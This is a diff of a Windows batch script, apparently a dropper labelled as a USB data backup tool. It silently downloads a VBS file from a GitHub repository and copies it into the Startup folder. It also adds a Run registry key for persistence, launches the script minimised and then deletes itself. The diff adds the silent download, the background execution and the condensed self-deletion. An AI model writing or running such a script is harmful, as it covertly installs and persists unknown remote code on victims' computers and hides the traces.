@@ -1,6 +1,6 @@
 @echo off
-REM Download the VBS file from GitHub
-curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs
+REM Download the VBS file from GitHub (Silent Mode)
+curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs --silent --output "%TEMP%\test.vbs"
 
 REM Copy the downloaded file to the Startup folder
 copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
@@ -8,12 +8,8 @@ copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
 REM Add test.vbs to startup
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestScript" /t REG_SZ /d "wscript \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs\"" /f
 
-REM Run the VBS file
-wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
+REM Run the VBS file in background (Prevents Freezing)
+start /min wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
 
-REM Step 6: Delete the BAT file after execution
-echo Deleting BAT file...
-del "%~f0"
-
-REM Step 7: Close CMD window automatically
-exit
+REM Self-delete batch file and close CMD
+start /b cmd /c del "%~f0" & exit
